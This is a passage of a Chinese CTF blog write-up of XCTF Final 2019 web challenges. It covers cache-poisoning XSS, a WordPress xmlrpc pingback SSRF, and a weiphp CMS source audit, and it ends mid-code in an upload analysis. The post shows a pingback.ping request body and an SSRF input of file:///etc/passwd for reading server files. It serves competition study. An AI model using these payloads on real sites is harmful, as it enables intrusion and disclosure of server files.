<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。
"><title>XCTF Final 2019 Web Write Up</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="XCTF Final 2019 Web Write Up">
<meta property="og:description" content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2019-11-14T00:02:53+00:00"><meta property="article:modified_time" content="2019-11-14T00:02:53+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="XCTF Final 2019 Web Write Up">
<meta name=twitter:description content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/11/14/XCTF-Final-2019/>XCTF Final 2019 Web Write Up</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 14, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
10 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。</p>
<p>[TOC]</p>
<h1 id=web>Web</h1>
<h2 id=babyblog>babyblog</h2>
<p>界面跟 Byte CTF 的 <a class=link href=https://blog.zeddyu.info/2019/09/17/bytectf2019/#babyblog target=_blank rel=noopener>babyblog</a> 一致，有些功能还保留着，很有误导性&mldr;以为是个升级版，前者是一道二次注入后用 php 正则<code>/e</code>特性来执行命令的，所以我们一开始也就一直在日注入了&mldr;</p>
<p>后来我发现<code>/user</code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现<code>/server_status</code>，发现有大家的访问记录。陷入思考ing&mldr;</p>
<p>队友突然看到有一个访问记录<code>/user/1.css</code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109012449.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109012449.png loading=lazy>
</a>
</figure></p>
<h2 id=babypress>babypress</h2>
<p>这题比较狗血&mldr;前一天给了两个 hint :</p>
<pre tabindex=0><code>first hint for babypress: ssrf n-day exploit on the internet will not work

second hint: if you can exploit in your local, it should be possible to exploit in remote.
</code></pre><p>随便搜一下我们大概可以知道 ssrf n-day 是通过 <code>xmlrpc.php</code> 这个文件来打内网的，然后当晚我们通过<code>xmlrpc.php</code>成功进行了 SSRF ，当看到了这两个 hint &mldr;我们就感觉不妙，应该打的不是我们这个， but 我们确实打成功了呀&mldr;于是我们当晚又加了一会班，当时最新版本是 5.2.4 ，于是我们找到 5.2.4 的 <a class=link href=https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ target=_blank rel=noopener>security issue</a>，然后找到了<a class=link href=https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2 target=_blank rel=noopener>更新补丁</a>，但是感觉绕不过&mldr;以为是个新的绕过方式啥的&mldr;</p>
<p>好了，结果到了第二天一开始没人打成功&mldr;后来，到了差不多中午主办方又发公告更换环境，当时我们都在看另一个题，也就没管，结果一会有两个队出了&mldr;然后我们试了一下昨晚我们打<code>xmlrpc.php</code>的，就成了&mldr;</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=nt>&lt;methodCall&gt;</span>
<span class=nt>&lt;methodName&gt;</span>pingback.ping<span class=nt>&lt;/methodName&gt;</span>
<span class=nt>&lt;params&gt;&lt;param&gt;</span>
<span class=nt>&lt;value&gt;&lt;string&gt;</span>http://<span class=nt>&lt;YOUR</span> <span class=err>SERVER</span> <span class=nt>&gt;</span>:<span class=nt>&lt;port&gt;&lt;/string&gt;&lt;/value&gt;</span>
<span class=nt>&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;</span>http://<span class=nt>&lt;SOME</span> <span class=err>VALID</span> <span class=err>BLOG</span> <span class=err>FROM</span> <span class=err>THE</span> <span class=err>SITE</span> <span class=nt>&gt;&lt;/string&gt;</span>
<span class=nt>&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;</span>
<span class=nt>&lt;/methodCall&gt;</span>
</code></pre></div><p>主要就是要发一个评论以及更改一下第二个参数为他的 host 才行&mldr;这题也没啥好说的&mldr;感觉全场唯一的槽点(Web)就是这个了。</p>
<h2 id=weiphp>weiphp</h2>
<p>一个叫 weiphp 的 CMS 审计，这个主要是队友看的，我当时做另外一道题去了。我们出的是一个 ssrf 的地方，赛后问了出的师傅，是审了上传的地方。</p>
<h3 id=ssrf>SSRF</h3>
<p>我们全局搜<code>curl</code>，可以在 Base.php 中发现有以下代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=k>function</span> <span class=nf>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=nv>$type</span> <span class=o>=</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span> <span class=nv>$return_array</span> <span class=o>=</span> <span class=k>true</span><span class=p>,</span> <span class=nv>$useCert</span> <span class=o>=</span> <span class=p>[])</span>
<span class=p>{</span>
  <span class=nv>$res</span> <span class=o>=</span> <span class=nx>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=nv>$type</span><span class=p>,</span> <span class=nv>$return_array</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>);</span>

  <span class=c1>// 各种常见错误判断
</span><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_erron&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_erron&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;: &#39;</span> <span class=o>.</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_error&#39;</span><span class=p>]);</span>
  <span class=p>}</span>
  <span class=k>if</span> <span class=p>(</span><span class=nv>$return_array</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;errcode&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;errcode&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nx>error_msg</span><span class=p>(</span><span class=nv>$res</span><span class=p>));</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;FAIL&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_msg&#39;</span><span class=p>]))</span> <span class=p>{</span>
      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_msg&#39;</span><span class=p>]);</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;result_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;result_code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;FAIL&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code_des&#39;</span><span class=p>]))</span> <span class=p>{</span>
      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;: &#39;</span> <span class=o>.</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code_des&#39;</span><span class=p>]);</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>跟进第三行的<code>post_data</code>，我们可以在 common.php 中找到该函数：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>function</span> <span class=nf>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span> <span class=o>=</span> <span class=p>[],</span> <span class=nv>$type</span> <span class=o>=</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span> <span class=nv>$return_array</span> <span class=o>=</span> <span class=k>true</span><span class=p>,</span> <span class=nv>$useCert</span> <span class=o>=</span> <span class=p>[])</span>
<span class=p>{</span>
    <span class=nv>$has_json</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;json&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$param</span><span class=p>))</span> <span class=p>{</span>
        <span class=nv>$has_json</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
        <span class=nv>$param</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$param</span><span class=p>,</span> <span class=nx>JSON_UNESCAPED_UNICODE</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;xml&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$param</span><span class=p>))</span> <span class=p>{</span>
        <span class=nv>$param</span> <span class=o>=</span> <span class=nx>ToXml</span><span class=p>(</span><span class=nv>$param</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>

    <span class=c1>// 初始化curl
</span><span class=c1></span>    <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>!=</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$param</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>
        <span class=c1>// 设置超时
</span><span class=c1></span>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_TIMEOUT</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// 设置超时
</span><span class=c1></span>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_TIMEOUT</span><span class=p>,</span> <span class=mi>180</span><span class=p>);</span>
    <span class=p>}</span>

    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_POST</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYHOST</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>

    <span class=c1>// 设置header
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$header</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;content-type: multipart/form-data; charset=UTF-8&#34;</span><span class=p>;</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;xml&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$has_json</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$header</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;content-type: application/json; charset=UTF-8&#34;</span><span class=p>;</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
    <span class=p>}</span>

    <span class=c1>// curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
</span><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_FOLLOWLOCATION</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_AUTOREFERER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
    <span class=c1>// dump($param);
</span><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_POSTFIELDS</span><span class=p>,</span> <span class=nv>$param</span><span class=p>);</span>
    <span class=c1>// 要求结果为字符串且输出到屏幕上
</span><span class=c1></span>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_RETURNTRANSFER</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
    <span class=c1>// 使用证书：cert 与 key 分别属于两个.pem文件
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;certPath&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;keyPath&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLCERTTYPE</span><span class=p>,</span> <span class=s1>&#39;PEM&#39;</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLCERT</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;certPath&#39;</span><span class=p>]);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLKEYTYPE</span><span class=p>,</span> <span class=s1>&#39;PEM&#39;</span><span class=p>);</span>
        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSLKEY</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>[</span><span class=s1>&#39;keyPath&#39;</span><span class=p>]);</span>
    <span class=p>}</span>

    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>!=</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=c1>// echo $res;die;
</span><span class=c1></span>    <span class=nv>$flat</span> <span class=o>=</span> <span class=nx>curl_errno</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>

    <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$flat</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$msg</span> <span class=o>=</span> <span class=nx>curl_error</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=c1>// add_request_log($url, $param, $res, $flat, $msg);
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$flat</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span> <span class=p>[</span>
            <span class=s1>&#39;curl_erron&#39;</span> <span class=o>=&gt;</span> <span class=nv>$flat</span><span class=p>,</span>
            <span class=s1>&#39;curl_error&#39;</span> <span class=o>=&gt;</span> <span class=nv>$msg</span>
        <span class=p>];</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$return_array</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$res</span><span class=p>))</span> <span class=p>{</span>
            <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;json&#39;</span> <span class=o>?</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$res</span><span class=p>,</span> <span class=k>true</span><span class=p>)</span> <span class=o>:</span> <span class=nx>FromXml</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
        <span class=p>}</span>

        <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>可以看到 common.php 中的没有什么过滤，所以我们只需要找引用 Base.php 当中的<code>post_data</code>函数的地方就行了。我们随便登录一下就可以发现其路由规则了，比如登录路由是<code>index.php/home/user/login</code>，对应的是<code>application/home/controller/User.php</code>当中的<code>login()</code>方法，而 Base.php 跟其他 controller 有以下继承关系：</p>
<pre tabindex=0><code>home/controller/User.php -&gt; home/controller/Home.php -&gt; common/controller/WebBase.php -&gt; common/controller/Base.php
</code></pre><p>所以<code>post_data</code>为 public 方法也可以直接调用，所以根据<code>post_data</code>方法的参数，我们需要传入几个参数，<code>url</code>为 SSRF 的点，<code>param</code>随笔即可。</p>
<p>这里由于 cms 开启了 debug ，这里要把<code>type</code>参数设为<code>file</code>，让<code>post_data</code>函数在调用<code>FromXml</code>函数的时候，由于我们传入诸如<code>url=file:///etc/passwd</code>的参数，会导致<code>simple_xml_load_string</code>出错</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=sd>/**
</span><span class=sd> * 将xml转为array
</span><span class=sd> */</span>
<span class=k>function</span> <span class=nf>FromXml</span><span class=p>(</span><span class=nv>$xml</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$xml</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>exception</span><span class=p>(</span><span class=s2>&#34;xml数据异常！&#34;</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nx>file_log</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=s1>&#39;FromXml&#39;</span><span class=p>);</span>

    <span class=c1>// 解决部分json数据误入的问题
</span><span class=c1></span>    <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$arr</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$arr</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=nv>$arr</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=c1>// 将XML转为array
</span><span class=c1></span>    <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nx>json_encode</span><span class=p>(</span><span class=nx>simplexml_load_string</span><span class=p>(</span><span class=nv>$xml</span><span class=p>,</span> <span class=s1>&#39;SimpleXMLElement&#39;</span><span class=p>,</span> <span class=nx>LIBXML_NOCDATA</span><span class=p>)),</span> <span class=k>true</span><span class=p>);</span>
    <span class=k>return</span> <span class=nv>$arr</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109024547.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109024547.png loading=lazy>
</a>
</figure></p>
<p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109020248.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109020248.png loading=lazy>
</a>
</figure></p>
<h3 id=upload>upload</h3>
<p>在<code>application/home/controller/File.php</code>我们可以看到有这么一个方法</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=cm>/* 文件上传 到根目录 */</span>
<span class=k>public</span> <span class=k>function</span> <span class=nf>upload_root</span><span class=p>()</span> <span class=p>{</span>
  <span class=nv>$return</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
    <span class=s1>&#39;status&#39;</span> <span class=o>=&gt;</span> <span class=mi>1</span><span class=p>,</span>
    <span class=s1>&#39;info&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;上传成功&#39;</span><span class=p>,</span>
    <span class=s1>&#39;data&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span>
  <span class=p>);</span>
  <span class=cm>/* 调用文件上传组件上传文件 */</span>
  <span class=nv>$File</span> <span class=o>=</span> <span class=nx>D</span><span class=p>(</span><span class=s1>&#39;home/File&#39;</span><span class=p>);</span>
  <span class=nv>$file_driver</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nx>config</span><span class=p>(</span><span class=s1>&#39;picture_upload_driver&#39;</span><span class=p>));</span>
  <span class=nv>$setting</span> <span class=o>=</span> <span class=k>array</span> <span class=p>(</span>
    <span class=s1>&#39;rootPath&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;./&#39;</span> <span class=p>,</span>
  <span class=p>);</span>
  <span class=nv>$info</span> <span class=o>=</span> <span class=nv>$File</span><span class=o>-&gt;</span><span class=na>upload</span><span class=p>(</span><span class=nv>$setting</span><span class=p>,</span> <span class=nx>config</span><span class=p>(</span><span class=s1>&#39;picture_upload_driver&#39;</span><span class=p>),</span> <span class=nx>config</span><span class=p>(</span><span class=s2>&#34;upload_</span><span class=si>{</span><span class=nv>$file_driver</span><span class=si>}</span><span class=s2>_config&#34;</span><span class=p>));</span>
  <span class=c1>//     	$info = $File-&gt;upload(config(&#39;download_upload&#39;), config(&#39;picture_upload_driver&#39;), config(&#34;upload_{$file_driver}_config&#34;));
</span><span class=c1></span>  <span class=cm>/* 记录附件信息 */</span>
  <span class=k>if</span> <span class=p>(</span><span class=nv>$info</span><span class=p>)</span> <span class=p>{</span>
    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
    <span class=nv>$return</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$info</span><span class=p>[</span><span class=s1>&#39;download&#39;</span><span class=p>],</span> <span class=nv>$return</span><span class=p>);</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
    <span class=nv>$return</span><span class=p>[</span><span class=s1>&#39;info&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$File</span><span class=o>-&gt;</span><span class=na>getError</span><span class=p>();</span>
  <span class=p>}</span>
  <span class=cm>/* 返回JSON数据 */</span>
  <span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$return</span><span class=p>);</span>

<span class=p>}</span>
</code></pre></div><p>其中是调用了<code>application/home/model/File.php</code>中的一个<code>upload</code>函数</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=k>function</span> <span class=nf>upload</span><span class=p>(</span><span class=nv>$setting</span> <span class=o>=</span> <span class=p>[],</span> <span class=nv>$driver</span> <span class=o>=</span> <span class=s1>&#39;Local&#39;</span><span class=p>,</span> <span class=nv>$config</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$isTest</span> <span class=o>=</span> <span class=k>false</span><span class=p>)</span>
<span class=p>{</span>
